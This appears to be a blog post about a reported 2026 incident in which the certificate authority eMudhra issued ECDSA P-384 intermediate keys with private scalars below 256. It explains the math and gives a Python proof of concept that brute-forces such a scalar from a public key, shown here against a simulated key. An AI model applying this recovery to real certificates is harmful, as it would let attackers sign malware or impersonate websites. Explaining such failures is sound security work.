Single Digit CA Private Key

Published: 2026 November 10-11

Lemme ask you a question, what was the shortest ECDSA p384v1 private key you have ever seen, well as the name suggests it's always 384-bit and a "short" key can only be formed either you misplaced the option in menu or that your algorithm is seriously broken. And that's what happened to the CA, eMudhra on October 17 2026 at roughly 18:05 UTC, a security researcher named Wayne publicly disclosed that 8 eMudhra private keys were weak and completely recoverable, to say accurately, this was one of the most critical PKI failures in recent internet times.

CA or Certificate Authority Keys are essentially the backbone of trust in internet, these are practically un-deconstructable(uh if managed correctly) verification keys used to cryptographically sign websites, binaries or emails and to mathematically prove that they have not been tampered with. In web, CA keys are what allows websites to be encrypted in which to get a website to be tagged 'secure', you need to get CA certificate from a CA agency, and that exposes the vulnerability that, as in normal cryptography, if you get access to the private key of a key pair you're essentially getting anything that it validates or decrypts for yourself. But as cryptographers are not stupid, we have immensely and tight and sound algorithms such as the ECDSA or Elliptic Curve Cryptography which produces keys which could take millions of years to brute-force because of their high-entropy and length.

But in that case we're only talking about the algorithms(which are extremely reliable), but then the reliability of the systems which you write to enforce these algorithms in practise heavily depends upon the code's rigor, hence we see a lot of leaks and vulnerabiliies breaking out each day in the fields of encryption, as if you make a math error(a very good way to prevent these errors is by using an existing battle-tested library for that encryption, don't make your own algorithms please!) in the code of your program which generates the keys, it can seriously mess with the entropy of your generated keys and even the damned length, where a program which is meant to generate keys which are 384-bit with a high score in Shannon scale, will end up being a single digit. Abd this is precisely what happened with eMudhra.

So in ECDSA, the public key(Q) is generated by multiplying it with the private key scalar(d) by a publicly known base point(G) on the curve

Q=d⋅G

and normally the private key d is secure, it'll be a massive, pseudo-randomly(because in mathematics it's impossible to achieve complete randomness) generated 384-bit number and reversing this equation (the Elliptic Curve Discrete Logarithm Problem, or ECDLP) is computationally infeasible because you will be looong dead before you decrypt it.

But in the case of eMudhra, in April 30th 2025, they did a generation of private keys for their P-384 ECDSA Intermediate CAs. But instead of using the tested and good generation script, they used an unapproved test script to generate the CAs, and guess what, that script had a pretty severe flaw in its key wrap/unwrap testing, the generated d DID NOT possess the needed 384-bit entropy. Instead every single private scalar evaluated to an integer below 256(0≤d<256). And it looks like there already warning signs, as in May 2025, eMudhra released Certificate Revocation Lists (CRLs) containing invalid signatures for the newly created intermediates, signaling the key cryptographic errors, but this was apparently overlooked.

And consequently in October 17 2026, a year later, the security researcher publicly disclosed the vulnerability and stated that they had found that 8 keys were compromised, 6 for TLS/SSL and 2 for code signing. And looking at how disastrous this is, with this 8 compromised, a skid could just code sign any malicious binary they want or an illicit website if they are having the private keys, as the base point and public keys are, what they suggests, PUBLIC. And recovering this private keys was laughably eeasy to say the least(according to the researcher who disclosed it), as the entropy of these generated keys were so low that one of them was literally a single digit....4, yeah literally the digit 4, you could use that single digit to literally code sign a Vidar or some RAT infected binary or certify a phishing site. Ans as we say it takes lifetimes to reconstruct a ECDSA private key, reconstructing this one took...less than 0.001 seconds.

So in reconstructing, as d is this unusually tiny number, you would first extract the public key, Q directly from public X.509 and CT Logs. Then instead of searching across a massive 2384 possibility space, your script looped through from d=0 to 255: Test d∈{0,1,2,3,…,255}

Then for each test integer, the script multiplied it by the curve's base point (G) to see if it matched the target public key: d⋅G=?Q

And within millisconds, one of the numbers (d) will successfully satisfy the equation, instantly revealing the exact private key scalar.

# laughably simple PoC
                                      from ecdsa import NIST384p, SigningKey, VerifyingKey
                                      
                                      def simulate_weak_key_generation():
                                          print("[*] Simulating flawed key generation (e.g., d = 4)...")
                                          # in the actual incident, a flawed script generated a tiny integer scalar
                                          # i'll use NIST384p (the curve affected in the incident).
                                          curve = NIST384p
                                          
                                          # let's pick a secret tiny scalar (representing the flawed random generator)
                                          secret_scalar = 4 
                                          
                                          # derive the private key and public key from this tiny scalar
                                          sk = SigningKey.from_secret_exponent(secret_scalar, curve=curve)
                                          vk = sk.get_verifying_key()
                                          
                                          return curve, vk.to_string(), secret_scalar
                                      
                                      def recover_private_key(curve, target_public_key_bytes):
                                          print("[*] Starting brute-force recovery across tiny search space (0 to 255)...")
                                          
                                          generator = curve.generator
                                          
                                          # convert target public key bytes back to a point for comparison
                                          target_vk = VerifyingKey.from_string(target_public_key_bytes, curve=curve)
                                          target_point = target_vk.pubkey.point
                                          
                                          # iterate through the entire weak entropy space (0 to 255)
                                          for candidate_d in range(256):
                                              # perform ECPM: candidate_d * G
                                              candidate_point = candidate_d * generator
                                              
                                              # check if the generated point matches the target public key point
                                              if candidate_point == target_point:
                                                  print(f"[+] SUCCESS! Found private key scalar: {candidate_d}")
                                                  return candidate_d
                                                  
                                          print("[-] Key not found in search space.")
                                          return None
                                      
                                      if __name__ == "__main__":
                                          curve, pub_bytes, actual_d = simulate_weak_key_generation()
                                          print(f"[*] Target Public Key obtained from Certificate (bytes length): {len(pub_bytes)}")
                                          
                                          # 2. run the recovery attack using ONLY the public key
                                          recovered_d = recover_private_key(curve, pub_bytes)
                                          
                                          # 3. verify correctness
                                          if recovered_d == actual_d:
                                              print(f"[+] Verified: Recovered scalar ({recovered_d}) matches the original secret!")
                                          else:
                                              print("[-] Verification failed.")

And that's how simple it was. Even though the situation was very bad, the damage control was quite fast and effective. As just roughly 1 hour later Chrome released an emergency CRLSet push, and Mozilla updated OneCRL, all within 2-5 hours of disclosure. And on October 18, eMudhra revoked all the 8 intermediate CAs using the caCompromise reason code. Later Python's certifi package released its update, 2026.10.18(literally the date itself), stripping the emSign roots. Later in 19 as part of the more thorough phase of the purge, Apple pushed trust store blocks for all 12 affected certificate variants. Then Sectigo revoked all cross-sign equivalents, Microslop pushed updates blocking the cooked hashes in Edge/Winslop. Later Go, Java and Linux released security advisories and patches for their own kernels, VMs and compilers. And as a cherry on top for all of this, on 22, eMudhra announced its complete voluntary exit from the SSL/TLS certificate field as Mozilla, Apple and Google announced complete distrust of eMudhra's emSign ECC Root CA - G3.

And as a consequence, several CVEs were disclosed in quite critical or major software things, like the CVE-2026-113812, assigned for Perl's Mozilla::CA bundle and the CVE-2026-115557 assigned for Python's std lib(ssl module context hardcoded denylists).

So in conclusion it was a hell of a disaster for the internet for like 1 day, but for ages to come for eMudhra, and the moral of the story, um....use tested key generation scripts :3
